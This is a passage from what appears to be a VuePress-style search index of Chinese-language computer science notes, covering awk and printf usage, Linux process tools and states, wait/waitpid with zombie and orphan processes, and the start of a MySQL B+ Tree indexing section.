$ printf '%10s %5i %5i %5i %8.2f \\n' $(cat printf.txt) DmTsai 80 60 92 77.33 VBird 75 55 80 70.00 Ken 60 90 70 73.33`},{header:"awk",slug:"awk",content:`\u662F\u7531 Alfred Aho\uFF0CPeter Weinberger \u548C Brian Kernighan \u521B\u9020\uFF0Cawk \u8FD9\u4E2A\u540D\u5B57\u5C31\u662F\u8FD9\u4E09\u4E2A\u521B\u59CB\u4EBA\u540D\u5B57\u7684\u9996\u5B57\u6BCD\u3002
awk \u6BCF\u6B21\u5904\u7406\u4E00\u884C\uFF0C\u5904\u7406\u7684\u6700\u5C0F\u5355\u4F4D\u662F\u5B57\u6BB5\uFF0C\u6BCF\u4E2A\u5B57\u6BB5\u7684\u547D\u540D\u65B9\u5F0F\u4E3A\uFF1A$n\uFF0Cn \u4E3A\u5B57\u6BB5\u53F7\uFF0C\u4ECE 1 \u5F00\u59CB\uFF0C$0 \u8868\u793A\u4E00\u6574\u884C\u3002
\u793A\u4F8B\uFF1A\u53D6\u51FA\u6700\u8FD1\u4E94\u4E2A\u767B\u5F55\u7528\u6237\u7684\u7528\u6237\u540D\u548C IP\u3002\u9996\u5148\u7528 last -n 5 \u53D6\u51FA\u7528\u6700\u8FD1\u4E94\u4E2A\u767B\u5F55\u7528\u6237\u7684\u6240\u6709\u4FE1\u606F\uFF0C\u53EF\u4EE5\u770B\u5230\u7528\u6237\u540D\u548C IP \u5206\u522B\u5728\u7B2C 1 \u5217\u548C\u7B2C 3 \u5217\uFF0C\u6211\u4EEC\u7528 $1 \u548C $3 \u5C31\u80FD\u53D6\u51FA\u8FD9\u4E24\u4E2A\u5B57\u6BB5\uFF0C\u7136\u540E\u7528 print \u8FDB\u884C\u6253\u5370\u3002
$ last -n 5
dmtsai pts/0 192.168.1.100 Tue Jul 14 17:32 still logged in
dmtsai pts/0 192.168.1.100 Thu Jul 9 23:36 - 02:58 (03:22)
dmtsai pts/0 192.168.1.100 Thu Jul 9 17:23 - 23:36 (06:12)
dmtsai pts/0 192.168.1.100 Thu Jul 9 08:02 - 08:17 (00:14)
dmtsai tty1 Fri May 29 11:55 - 12:11 (00:15)
$ last -n 5 | awk '{print $1 "\\t" $3}'
dmtsai 192.168.1.100
dmtsai 192.168.1.100
dmtsai 192.168.1.100
dmtsai 192.168.1.100
dmtsai Fri
\u53EF\u4EE5\u6839\u636E\u5B57\u6BB5\u7684\u67D0\u4E9B\u6761\u4EF6\u8FDB\u884C\u5339\u914D\uFF0C\u4F8B\u5982\u5339\u914D\u5B57\u6BB5\u5C0F\u4E8E\u67D0\u4E2A\u503C\u7684\u90A3\u4E00\u884C\u6570\u636E\u3002
awk '\u6761\u4EF6\u7C7B\u578B 1 {\u52A8\u4F5C 1} \u6761\u4EF6\u7C7B\u578B 2 {\u52A8\u4F5C 2} ...' filename
\u793A\u4F8B\uFF1A/etc/passwd \u6587\u4EF6\u7B2C\u4E09\u4E2A\u5B57\u6BB5\u4E3A UID\uFF0C\u5BF9 UID \u5C0F\u4E8E 10 \u7684\u6570\u636E\u8FDB\u884C\u5904\u7406\u3002
$ cat /etc/passwd | awk 'BEGIN {FS=":"} $3 < 10 {print $1 "\\t " $3}'
root 0
bin 1
daemon 2
awk \u53D8\u91CF\uFF1A \u53D8\u91CF\u540D\u79F0
\u4EE3\u8868\u610F\u4E49 NF
\u6BCF\u4E00\u884C\u62E5\u6709\u7684\u5B57\u6BB5\u603B\u6570 NR
\u76EE\u524D\u6240\u5904\u7406\u7684\u662F\u7B2C\u51E0\u884C\u6570\u636E FS
\u76EE\u524D\u7684\u5206\u9694\u5B57\u7B26\uFF0C\u9ED8\u8BA4\u662F\u7A7A\u683C\u952E \u793A\u4F8B\uFF1A\u663E\u793A\u6B63\u5728\u5904\u7406\u7684\u884C\u53F7\u4EE5\u53CA\u6BCF\u4E00\u884C\u6709\u591A\u5C11\u5B57\u6BB5
$ last -n 5 | awk '{print $1 "\\t lines: " NR "\\t columns: " NF}'
dmtsai lines: 1 columns: 10
dmtsai lines: 2 columns: 10
dmtsai lines: 3 columns: 10
dmtsai lines: 4 columns: 10
dmtsai lines: 5 columns: 9`},{header:"\u5341\u3001\u8FDB\u7A0B\u7BA1\u7406",slug:"\u5341\u3001\u8FDB\u7A0B\u7BA1\u7406",content:""},{header:"\u67E5\u770B\u8FDB\u7A0B",slug:"\u67E5\u770B\u8FDB\u7A0B",content:""},{header:"1. ps",slug:"_1-ps",content:`\u67E5\u770B\u67D0\u4E2A\u65F6\u95F4\u70B9\u7684\u8FDB\u7A0B\u4FE1\u606F\u3002
\u793A\u4F8B\uFF1A\u67E5\u770B\u81EA\u5DF1\u7684\u8FDB\u7A0B
## ps -l
\u793A\u4F8B\uFF1A\u67E5\u770B\u7CFB\u7EDF\u6240\u6709\u8FDB\u7A0B
## ps aux
\u793A\u4F8B\uFF1A\u67E5\u770B\u7279\u5B9A\u7684\u8FDB\u7A0B
## ps aux | grep threadx`},{header:"2. pstree",slug:"_2-pstree",content:`\u67E5\u770B\u8FDB\u7A0B\u6811\u3002
\u793A\u4F8B\uFF1A\u67E5\u770B\u6240\u6709\u8FDB\u7A0B\u6811
## pstree -A`},{header:"3. top",slug:"_3-top",content:`\u5B9E\u65F6\u663E\u793A\u8FDB\u7A0B\u4FE1\u606F\u3002
\u793A\u4F8B\uFF1A\u4E24\u79D2\u949F\u5237\u65B0\u4E00\u6B21
## top -d 2`},{header:"4. netstat",slug:"_4-netstat",content:`\u67E5\u770B\u5360\u7528\u7AEF\u53E3\u7684\u8FDB\u7A0B
\u793A\u4F8B\uFF1A\u67E5\u770B\u7279\u5B9A\u7AEF\u53E3\u7684\u8FDB\u7A0B
## netstat -anp | grep port`},{header:"\u8FDB\u7A0B\u72B6\u6001",slug:"\u8FDB\u7A0B\u72B6\u6001",content:`\u72B6\u6001
\u8BF4\u660E R
running or runnable (on run queue)\u6B63\u5728\u6267\u884C\u6216\u8005\u53EF\u6267\u884C\uFF0C\u6B64\u65F6\u8FDB\u7A0B\u4F4D\u4E8E\u6267\u884C\u961F\u5217\u4E2D\u3002 D
uninterruptible sleep (usually I/O)\u4E0D\u53EF\u4E2D\u65AD\u963B\u585E\uFF0C\u901A\u5E38\u4E3A IO \u963B\u585E\u3002 S
interruptible sleep (waiting for an event to complete) \u53EF\u4E2D\u65AD\u963B\u585E\uFF0C\u6B64\u65F6\u8FDB\u7A0B\u6B63\u5728\u7B49\u5F85\u67D0\u4E2A\u4E8B\u4EF6\u5B8C\u6210\u3002 Z
zombie (terminated but not reaped by its parent)\u50F5\u6B7B\uFF0C\u8FDB\u7A0B\u5DF2\u7ECF\u7EC8\u6B62\u4F46\u662F\u5C1A\u672A\u88AB\u5176\u7236\u8FDB\u7A0B\u83B7\u53D6\u4FE1\u606F\u3002 T
stopped (either by a job control signal or because it is being traced) \u7ED3\u675F\uFF0C\u8FDB\u7A0B\u65E2\u53EF\u4EE5\u88AB\u4F5C\u4E1A\u63A7\u5236\u4FE1\u53F7\u7ED3\u675F\uFF0C\u4E5F\u53EF\u80FD\u662F\u6B63\u5728\u88AB\u8FFD\u8E2A\u3002`},{header:"SIGCHLD",slug:"sigchld",content:`\u5F53\u4E00\u4E2A\u5B50\u8FDB\u7A0B\u6539\u53D8\u4E86\u5B83\u7684\u72B6\u6001\u65F6\uFF08\u505C\u6B62\u8FD0\u884C\uFF0C\u7EE7\u7EED\u8FD0\u884C\u6216\u8005\u9000\u51FA\uFF09\uFF0C\u6709\u4E24\u4EF6\u4E8B\u4F1A\u53D1\u751F\u5728\u7236\u8FDB\u7A0B\u4E2D\uFF1A \u5F97\u5230 SIGCHLD \u4FE1\u53F7\uFF1B
waitpid() \u6216\u8005 wait() \u8C03\u7528\u4F1A\u8FD4\u56DE\u3002 \u5176\u4E2D\u5B50\u8FDB\u7A0B\u53D1\u9001\u7684 SIGCHLD \u4FE1\u53F7\u5305\u542B\u4E86\u5B50\u8FDB\u7A0B\u7684\u4FE1\u606F\uFF0C\u6BD4\u5982\u8FDB\u7A0B ID\u3001\u8FDB\u7A0B\u72B6\u6001\u3001\u8FDB\u7A0B\u4F7F\u7528 CPU \u7684\u65F6\u95F4\u7B49\u3002
\u5728\u5B50\u8FDB\u7A0B\u9000\u51FA\u65F6\uFF0C\u5B83\u7684\u8FDB\u7A0B\u63CF\u8FF0\u7B26\u4E0D\u4F1A\u7ACB\u5373\u91CA\u653E\uFF0C\u8FD9\u662F\u4E3A\u4E86\u8BA9\u7236\u8FDB\u7A0B\u5F97\u5230\u5B50\u8FDB\u7A0B\u4FE1\u606F\uFF0C\u7236\u8FDB\u7A0B\u901A\u8FC7 wait() \u548C waitpid() \u6765\u83B7\u5F97\u4E00\u4E2A\u5DF2\u7ECF\u9000\u51FA\u7684\u5B50\u8FDB\u7A0B\u7684\u4FE1\u606F\u3002`},{header:"wait()",slug:"wait",content:`pid_t wait(int *status)
\u7236\u8FDB\u7A0B\u8C03\u7528 wait() \u4F1A\u4E00\u76F4\u963B\u585E\uFF0C\u76F4\u5230\u6536\u5230\u4E00\u4E2A\u5B50\u8FDB\u7A0B\u9000\u51FA\u7684 SIGCHLD \u4FE1\u53F7\uFF0C\u4E4B\u540E wait() \u51FD\u6570\u4F1A\u9500\u6BC1\u5B50\u8FDB\u7A0B\u5E76\u8FD4\u56DE\u3002
\u5982\u679C\u6210\u529F\uFF0C\u8FD4\u56DE\u88AB\u6536\u96C6\u7684\u5B50\u8FDB\u7A0B\u7684\u8FDB\u7A0B ID\uFF1B\u5982\u679C\u8C03\u7528\u8FDB\u7A0B\u6CA1\u6709\u5B50\u8FDB\u7A0B\uFF0C\u8C03\u7528\u5C31\u4F1A\u5931\u8D25\uFF0C\u6B64\u65F6\u8FD4\u56DE -1\uFF0C\u540C\u65F6 errno \u88AB\u7F6E\u4E3A ECHILD\u3002
\u53C2\u6570 status \u7528\u6765\u4FDD\u5B58\u88AB\u6536\u96C6\u7684\u5B50\u8FDB\u7A0B\u9000\u51FA\u65F6\u7684\u4E00\u4E9B\u72B6\u6001\uFF0C\u5982\u679C\u5BF9\u8FD9\u4E2A\u5B50\u8FDB\u7A0B\u662F\u5982\u4F55\u6B7B\u6389\u7684\u6BEB\u4E0D\u5728\u610F\uFF0C\u53EA\u60F3\u628A\u8FD9\u4E2A\u5B50\u8FDB\u7A0B\u6D88\u706D\u6389\uFF0C\u53EF\u4EE5\u8BBE\u7F6E\u8FD9\u4E2A\u53C2\u6570\u4E3A NULL\u3002`},{header:"waitpid()",slug:"waitpid",content:`pid_t waitpid(pid_t pid, int *status, int options)
\u4F5C\u7528\u548C wait() \u5B8C\u5168\u76F8\u540C\uFF0C\u4F46\u662F\u591A\u4E86\u4E24\u4E2A\u53EF\u7531\u7528\u6237\u63A7\u5236\u7684\u53C2\u6570 pid \u548C options\u3002
pid \u53C2\u6570\u6307\u793A\u4E00\u4E2A\u5B50\u8FDB\u7A0B\u7684 ID\uFF0C\u8868\u793A\u53EA\u5173\u5FC3\u8FD9\u4E2A\u5B50\u8FDB\u7A0B\u9000\u51FA\u7684 SIGCHLD \u4FE1\u53F7\u3002\u5982\u679C pid=-1 \u65F6\uFF0C\u90A3\u4E48\u548C wait() \u4F5C\u7528\u76F8\u540C\uFF0C\u90FD\u662F\u5173\u5FC3\u6240\u6709\u5B50\u8FDB\u7A0B\u9000\u51FA\u7684 SIGCHLD \u4FE1\u53F7\u3002
options \u53C2\u6570\u4E3B\u8981\u6709 WNOHANG \u548C WUNTRACED \u4E24\u4E2A\u9009\u9879\uFF0CWNOHANG \u53EF\u4EE5\u4F7F waitpid() \u8C03\u7528\u53D8\u6210\u975E\u963B\u585E\u7684\uFF0C\u4E5F\u5C31\u662F\u8BF4\u5B83\u4F1A\u7ACB\u5373\u8FD4\u56DE\uFF0C\u7236\u8FDB\u7A0B\u53EF\u4EE5\u7EE7\u7EED\u6267\u884C\u5176\u5B83\u4EFB\u52A1\u3002`},{header:"\u5B64\u513F\u8FDB\u7A0B",slug:"\u5B64\u513F\u8FDB\u7A0B",content:`\u4E00\u4E2A\u7236\u8FDB\u7A0B\u9000\u51FA\uFF0C\u800C\u5B83\u7684\u4E00\u4E2A\u6216\u591A\u4E2A\u5B50\u8FDB\u7A0B\u8FD8\u5728\u8FD0\u884C\uFF0C\u90A3\u4E48\u8FD9\u4E9B\u5B50\u8FDB\u7A0B\u5C06\u6210\u4E3A\u5B64\u513F\u8FDB\u7A0B\u3002
\u5B64\u513F\u8FDB\u7A0B\u5C06\u88AB init \u8FDB\u7A0B\uFF08\u8FDB\u7A0B\u53F7\u4E3A 1\uFF09\u6240\u6536\u517B\uFF0C\u5E76\u7531 init \u8FDB\u7A0B\u5BF9\u5B83\u4EEC\u5B8C\u6210\u72B6\u6001\u6536\u96C6\u5DE5\u4F5C\u3002
\u7531\u4E8E\u5B64\u513F\u8FDB\u7A0B\u4F1A\u88AB init \u8FDB\u7A0B\u6536\u517B\uFF0C\u6240\u4EE5\u5B64\u513F\u8FDB\u7A0B\u4E0D\u4F1A\u5BF9\u7CFB\u7EDF\u9020\u6210\u5371\u5BB3\u3002`},{header:"\u50F5\u5C38\u8FDB\u7A0B",slug:"\u50F5\u5C38\u8FDB\u7A0B",content:`\u4E00\u4E2A\u5B50\u8FDB\u7A0B\u7684\u8FDB\u7A0B\u63CF\u8FF0\u7B26\u5728\u5B50\u8FDB\u7A0B\u9000\u51FA\u65F6\u4E0D\u4F1A\u91CA\u653E\uFF0C\u53EA\u6709\u5F53\u7236\u8FDB\u7A0B\u901A\u8FC7 wait() \u6216 waitpid() \u83B7\u53D6\u4E86\u5B50\u8FDB\u7A0B\u4FE1\u606F\u540E\u624D\u4F1A\u91CA\u653E\u3002\u5982\u679C\u5B50\u8FDB\u7A0B\u9000\u51FA\uFF0C\u800C\u7236\u8FDB\u7A0B\u5E76\u6CA1\u6709\u8C03\u7528 wait() \u6216 waitpid()\uFF0C\u90A3\u4E48\u5B50\u8FDB\u7A0B\u7684\u8FDB\u7A0B\u63CF\u8FF0\u7B26\u4ECD\u7136\u4FDD\u5B58\u5728\u7CFB\u7EDF\u4E2D\uFF0C\u8FD9\u79CD\u8FDB\u7A0B\u79F0\u4E4B\u4E3A\u50F5\u5C38\u8FDB\u7A0B\u3002
\u50F5\u5C38\u8FDB\u7A0B\u901A\u8FC7 ps \u547D\u4EE4\u663E\u793A\u51FA\u6765\u7684\u72B6\u6001\u4E3A Z\uFF08zombie\uFF09\u3002
\u7CFB\u7EDF\u6240\u80FD\u4F7F\u7528\u7684\u8FDB\u7A0B\u53F7\u662F\u6709\u9650\u7684\uFF0C\u5982\u679C\u4EA7\u751F\u5927\u91CF\u50F5\u5C38\u8FDB\u7A0B\uFF0C\u5C06\u56E0\u4E3A\u6CA1\u6709\u53EF\u7528\u7684\u8FDB\u7A0B\u53F7\u800C\u5BFC\u81F4\u7CFB\u7EDF\u4E0D\u80FD\u4EA7\u751F\u65B0\u7684\u8FDB\u7A0B\u3002
\u8981\u6D88\u706D\u7CFB\u7EDF\u4E2D\u5927\u91CF\u7684\u50F5\u5C38\u8FDB\u7A0B\uFF0C\u53EA\u9700\u8981\u5C06\u5176\u7236\u8FDB\u7A0B\u6740\u6B7B\uFF0C\u6B64\u65F6\u50F5\u5C38\u8FDB\u7A0B\u5C31\u4F1A\u53D8\u6210\u5B64\u513F\u8FDB\u7A0B\uFF0C\u4ECE\u800C\u88AB init \u8FDB\u7A0B\u6240\u6536\u517B\uFF0C\u8FD9\u6837 init \u8FDB\u7A0B\u5C31\u4F1A\u91CA\u653E\u6240\u6709\u7684\u50F5\u5C38\u8FDB\u7A0B\u6240\u5360\u6709\u7684\u8D44\u6E90\uFF0C\u4ECE\u800C\u7ED3\u675F\u50F5\u5C38\u8FDB\u7A0B\u3002`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`\u9E1F\u54E5. \u9E1F \u54E5 \u7684 Linux \u79C1 \u623F \u83DC \u57FA \u7840 \u7BC7 \u7B2C \u4E09 \u7248[J]. 2009.
Linux \u5E73\u53F0\u4E0A\u7684\u8F6F\u4EF6\u5305\u7BA1\u7406
Linux \u4E4B\u5B88\u62A4\u8FDB\u7A0B\u3001\u50F5\u6B7B\u8FDB\u7A0B\u4E0E\u5B64\u513F\u8FDB\u7A0B
What is the difference between a symbolic link and a hard link?
Linux process states
GUID Partition Table
\u8BE6\u89E3 wait \u548C waitpid \u51FD\u6570
IDE\u3001SATA\u3001SCSI\u3001SAS\u3001FC\u3001SSD \u786C\u76D8\u7C7B\u578B\u4ECB\u7ECD
Akai IB-301S SCSI Interface for S2800,S3000
Parallel ATA
ADATA XPG SX900 256GB SATA 3 SSD Review \u2013 Expanded Capacity and SandForce Driven Speed
Decoding UCS Invicta \u2013 Part 1
\u786C\u76D8
Difference between SAS and SATA
BIOS
File system design case studies
Programming Project #4
FILE SYSTEM DESIGN`}]},{path:"/java/MySQL.html",title:"MySQL",pathLocale:"/",contents:[{header:"MySQL",slug:"mysql",content:`MySQL \u4E00\u3001\u7D22\u5F15 B+ Tree \u539F\u7406
MySQL \u7D22\u5F15
\u7D22\u5F15\u4F18\u5316
\u7D22\u5F15\u7684\u4F18\u70B9
\u7D22\u5F15\u7684\u4F7F\u7528\u6761\u4EF6 \u4E8C\u3001\u67E5\u8BE2\u6027\u80FD\u4F18\u5316 \u4F7F\u7528 Explain \u8FDB\u884C\u5206\u6790
\u4F18\u5316\u6570\u636E\u8BBF\u95EE
\u91CD\u6784\u67E5\u8BE2\u65B9\u5F0F \u4E09\u3001\u5B58\u50A8\u5F15\u64CE InnoDB
MyISAM
\u6BD4\u8F83 \u56DB\u3001\u6570\u636E\u7C7B\u578B \u6574\u578B
\u6D6E\u70B9\u6570
\u5B57\u7B26\u4E32
\u65F6\u95F4\u548C\u65E5\u671F \u4E94\u3001\u5207\u5206 \u6C34\u5E73\u5207\u5206
\u5782\u76F4\u5207\u5206
Sharding \u7B56\u7565
Sharding \u5B58\u5728\u7684\u95EE\u9898 \u516D\u3001\u590D\u5236 \u4E3B\u4ECE\u590D\u5236
\u8BFB\u5199\u5206\u79BB \u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u7D22\u5F15",slug:"\u4E00\u3001\u7D22\u5F15",content:""},{header:"B+ Tree \u539F\u7406",slug:"b-tree-\u539F\u7406",content:""},{header:"1. \u6570\u636E\u7ED3\u6784",slug:"_1-\u6570\u636E\u7ED3\u6784",content:`B Tree \u6307\u7684\u662F Balance Tree\uFF0C\u4E5F\u5C31\u662F\u5E73\u8861\u6811\u3002\u5E73\u8861\u6811\u662F\u4E00\u9897\u67E5\u627E\u6811\uFF0C\u5E76\u4E14\u6240\u6709\u53F6\u5B50\u8282\u70B9\u4F4D\u4E8E\u540C\u4E00\u5C42\u3002
B+ Tree \u662F\u57FA\u4E8E B Tree \u548C\u53F6\u5B50\u8282\u70B9\u987A\u5E8F\u8BBF\u95EE\u6307\u9488\u8FDB\u884C\u5B9E\u73B0\uFF0C\u5B83\u5177\u6709 B Tree \u7684\u5E73\u8861\u6027\uFF0C\u5E76\u4E14\u901A\u8FC7\u987A\u5E8F\u8BBF\u95EE\u6307\u9488\u6765\u63D0\u9AD8\u533A\u95F4\u67E5\u8BE2\u7684\u6027\u80FD\u3002
\u5728 B+ Tree \u4E2D\uFF0C\u4E00\u4E2A\u8282\u70B9\u4E2D\u7684 key \u4ECE\u5DE6\u5230\u53F3\u975E\u9012\u51CF\u6392\u5217\uFF0C\u5982\u679C\u67D0\u4E2A\u6307\u9488\u7684\u5DE6\u53F3\u76F8\u90BB key \u5206\u522B\u662F keyi \u548C keyi+1\uFF0C\u4E14\u4E0D\u4E3A null\uFF0C\u5219\u8BE5\u6307\u9488\u6307\u5411\u8282\u70B9\u7684\u6240\u6709 key \u5927\u4E8E\u7B49\u4E8E keyi \u4E14\u5C0F\u4E8E\u7B49\u4E8E keyi+1\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/33576849-9275-47bb-ada7-8ded5f5e7c73.png" width="350px">`},{header:"2. \u64CD\u4F5C",slug:"_2-\u64CD\u4F5C",content:`\u8FDB\u884C\u67E5\u627E\u64CD\u4F5C\u65F6\uFF0C\u9996\u5148\u5728\u6839\u8282\u70B9\u8FDB\u884C\u4E8C\u5206\u67E5\u627E\uFF0C\u627E\u5230\u4E00\u4E2A key \u6240\u5728\u7684\u6307\u9488\uFF0C\u7136\u540E\u9012\u5F52\u5730\u5728\u6307\u9488\u6240\u6307\u5411\u7684\u8282\u70B9\u8FDB\u884C\u67E5\u627E\u3002\u76F4\u5230\u67E5\u627E\u5230\u53F6\u5B50\u8282\u70B9\uFF0C\u7136\u540E\u5728\u53F6\u5B50\u8282\u70B9\u4E0A\u8FDB\u884C\u4E8C\u5206\u67E5\u627E\uFF0C\u627E\u51FA key \u6240\u5BF9\u5E94\u7684 data\u3002
\u63D2\u5165\u5220\u9664\u64CD\u4F5C\u4F1A\u7834\u574F\u5E73\u8861\u6811\u7684\u5E73\u8861\u6027\uFF0C\u56E0\u6B64\u5728\u8FDB\u884C\u63D2\u5165\u5220\u9664\u64CD\u4F5C\u4E4B\u540E\uFF0C\u9700\u8981\u5BF9\u6811\u8FDB\u884C\u5206\u88C2\u3001\u5408\u5E76\u3001\u65CB\u8F6C\u7B49\u64CD\u4F5C\u6765\u7EF4\u62A4\u5E73\u8861\u6027\u3002`},{header:"3. \u4E0E\u7EA2\u9ED1\u6811\u7684\u6BD4\u8F83",slug:"_3-\u4E0E\u7EA2\u9ED1\u6811\u7684\u6BD4\u8F83",content:`\u7EA2\u9ED1\u6811\u7B49\u5E73\u8861\u6811\u4E5F\u53EF\u4EE5\u7528\u6765\u5B9E\u73B0\u7D22\u5F15\uFF0C\u4F46\u662F\u6587\u4EF6\u7CFB\u7EDF\u53CA\u6570\u636E\u5E93\u7CFB\u7EDF\u666E\u904D\u91C7\u7528 B+ Tree \u4F5C\u4E3A\u7D22\u5F15\u7ED3\u6784\uFF0C\u8FD9\u662F\u56E0\u4E3A\u4F7F\u7528 B+ \u6811\u8BBF\u95EE\u78C1\u76D8\u6570\u636E\u6709\u66F4\u9AD8\u7684\u6027\u80FD\u3002
\uFF08\u4E00\uFF09B+ \u6811\u6709\u66F4\u4F4E\u7684\u6811\u9AD8
\u5E73\u8861\u6811\u7684\u6811\u9AD8 O(h)=O(logdN)\uFF0C\u5176\u4E2D d \u4E3A\u6BCF\u4E2A\u8282\u70B9\u7684\u51FA\u5EA6\u3002\u7EA2\u9ED1\u6811\u7684\u51FA\u5EA6\u4E3A 2\uFF0C\u800C B+ Tree \u7684\u51FA\u5EA6\u4E00\u822C\u90FD\u975E\u5E38\u5927\uFF0C\u6240\u4EE5\u7EA2\u9ED1\u6811\u7684\u6811\u9AD8 h \u5F88\u660E\u663E\u6BD4 B+ Tree \u5927\u975E\u5E38\u591A\u3002
\uFF08\u4E8C\uFF09\u78C1\u76D8\u8BBF\u95EE\u539F\u7406
\u64CD\u4F5C\u7CFB\u7EDF\u4E00\u822C\u5C06\u5185\u5B58\u548C\u78C1\u76D8\u5206\u5272\u6210\u56FA\u5B9A\u5927\u5C0F\u7684\u5757\uFF0C\u6BCF\u4E00\u5757\u79F0\u4E3A\u4E00\u9875\uFF0C\u5185\u5B58\u4E0E\u78C1\u76D8\u4EE5\u9875\u4E3A\u5355\u4F4D\u4EA4\u6362\u6570\u636E\u3002\u6570\u636E\u5E93\u7CFB\u7EDF\u5C06\u7D22\u5F15\u7684\u4E00\u4E2A\u8282\u70B9\u7684\u5927\u5C0F\u8BBE\u7F6E\u4E3A\u9875\u7684\u5927\u5C0F\uFF0C\u4F7F\u5F97\u4E00\u6B21 I/O \u5C31\u80FD\u5B8C\u5168\u8F7D\u5165\u4E00\u4E2A\u8282\u70B9\u3002
\u5982\u679C\u6570\u636E\u4E0D\u5728\u540C\u4E00\u4E2A\u78C1\u76D8\u5757\u4E0A\uFF0C\u90A3\u4E48\u901A\u5E38\u9700\u8981\u79FB\u52A8\u5236\u52A8\u624B\u81C2\u8FDB\u884C\u5BFB\u9053\uFF0C\u800C\u5236\u52A8\u624B\u81C2\u56E0\u4E3A\u5176\u7269\u7406\u7ED3\u6784\u5BFC\u81F4\u4E86\u79FB\u52A8\u6548\u7387\u4F4E\u4E0B\uFF0C\u4ECE\u800C\u589E\u52A0\u78C1\u76D8\u6570\u636E\u8BFB\u53D6\u65F6\u95F4\u3002B+ \u6811\u76F8\u5BF9\u4E8E\u7EA2\u9ED1\u6811\u6709\u66F4\u4F4E\u7684\u6811\u9AD8\uFF0C\u8FDB\u884C\u5BFB\u9053\u7684\u6B21\u6570\u4E0E\u6811\u9AD8\u6210\u6B63\u6BD4\uFF0C\u5728\u540C\u4E00\u4E2A\u78C1\u76D8\u5757\u4E0A\u8FDB\u884C\u8BBF\u95EE\u53EA\u9700\u8981\u5F88\u77ED\u7684\u78C1\u76D8\u65CB\u8F6C\u65F6\u95F4\uFF0C\u6240\u4EE5 B+ \u6811\u66F4\u9002\u5408\u78C1\u76D8\u6570\u636E\u7684\u8BFB\u53D6\u3002
\uFF08\u4E09\uFF09\u78C1\u76D8\u9884\u8BFB\u7279\u6027
\u4E3A\u4E86\u51CF\u5C11\u78C1\u76D8 I/O \u64CD\u4F5C\uFF0C\u78C1\u76D8\u5F80\u5F80\u4E0D\u662F\u4E25\u683C\u6309\u9700\u8BFB\u53D6\uFF0C\u800C\u662F\u6BCF\u6B21\u90FD\u4F1A\u9884\u8BFB\u3002\u9884\u8BFB\u8FC7\u7A0B\u4E2D\uFF0C\u78C1\u76D8\u8FDB\u884C\u987A\u5E8F\u8BFB\u53D6\uFF0C\u987A\u5E8F\u8BFB\u53D6\u4E0D\u9700\u8981\u8FDB\u884C\u78C1\u76D8\u5BFB\u9053\uFF0C\u5E76\u4E14\u53EA\u9700\u8981\u5F88\u77ED\u7684\u78C1\u76D8\u65CB\u8F6C\u65F6\u95F4\uFF0C\u901F\u5EA6\u4F1A\u975E\u5E38\u5FEB\u3002\u5E76\u4E14\u53EF\u4EE5\u5229\u7528\u9884\u8BFB\u7279\u6027\uFF0C\u76F8\u90BB\u7684\u8282\u70B9\u4E5F\u80FD\u591F\u88AB\u9884\u5148\u8F7D\u5165\u3002`},{header:"MySQL \u7D22\u5F15",slug:"mysql-\u7D22\u5F15",content:"\u7D22\u5F15\u662F\u5728\u5B58\u50A8\u5F15\u64CE\u5C42\u5B9E\u73B0\u7684\uFF0C\u800C\u4E0D\u662F\u5728\u670D\u52A1\u5668\u5C42\u5B9E\u73B0\u7684\uFF0C\u6240\u4EE5\u4E0D\u540C\u5B58\u50A8\u5F15\u64CE\u5177\u6709\u4E0D\u540C\u7684\u7D22\u5F15\u7C7B\u578B\u548C\u5B9E\u73B0\u3002"},{header:"1. B+Tree \u7D22\u5F15",slug:"_1-b-tree-\u7D22\u5F15",content:`\u662F\u5927\u591A\u6570 MySQL \u5B58\u50A8\u5F15\u64CE\u7684\u9ED8\u8BA4\u7D22\u5F15\u7C7B\u578B\u3002
\u56E0\u4E3A\u4E0D\u518D\u9700\u8981\u8FDB\u884C\u5168\u8868\u626B\u63CF\uFF0C\u53EA\u9700\u8981\u5BF9\u6811\u8FDB\u884C\u641C\u7D22\u5373\u53EF\uFF0C\u6240\u4EE5\u67E5\u627E\u901F\u5EA6\u5FEB\u5F88\u591A\u3002
\u56E0\u4E3A B+ Tree \u7684\u6709\u5E8F\u6027\uFF0C\u6240\u4EE5\u9664\u4E86\u7528\u4E8E\u67E5\u627E\uFF0C\u8FD8\u53EF\u4EE5\u7528\u4E8E\u6392\u5E8F\u548C\u5206\u7EC4\u3002
\u53EF\u4EE5\u6307\u5B9A\u591A\u4E2A\u5217\u4F5C\u4E3A\u7D22\u5F15\u5217\uFF0C\u591A\u4E2A\u7D22\u5F15\u5217\u5171\u540C\u7EC4\u6210\u952E\u3002
\u9002\u7528\u4E8E\u5168\u952E\u503C\u3001\u952E\u503C\u8303\u56F4\u548C\u952E\u524D\u7F00\u67E5\u627E\uFF0C\u5176\u4E2D\u952E\u524D\u7F00\u67E5\u627E\u53EA\u9002\u7528\u4E8E\u6700\u5DE6\u524D\u7F00\u67E5\u627E\u3002\u5982\u679C\u4E0D\u662F\u6309\u7167\u7D22\u5F15\u5217\u7684\u987A\u5E8F\u8FDB\u884C\u67E5\u627E\uFF0C\u5219\u65E0\u6CD5\u4F7F\u7528\u7D22\u5F15\u3002
InnoDB \u7684 B+Tree \u7D22\u5F15\u5206\u4E3A\u4E3B\u7D22\u5F15\u548C\u8F85\u52A9\u7D22\u5F15\u3002\u4E3B\u7D22\u5F15\u7684\u53F6\u5B50\u8282\u70B9 data \u57DF\u8BB0\u5F55\u7740\u5B8C\u6574\u7684\u6570\u636E\u8BB0\u5F55\uFF0C\u8FD9\u79CD\u7D22\u5F15\u65B9\u5F0F\u88AB\u79F0\u4E3A\u805A\u7C07\u7D22\u5F15\u3002\u56E0\u4E3A\u65E0\u6CD5\u628A\u6570\u636E\u884C\u5B58\u653E\u5728\u4E24\u4E2A\u4E0D\u540C\u7684\u5730\u65B9\uFF0C\u6240\u4EE5\u4E00\u4E2A\u8868\u53EA\u80FD\u6709\u4E00\u4E2A\u805A\u7C07\u7D22\u5F15\u3002
![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/45016e98-6879-4709-8569-262b2d6d60b9.png" width="350px">
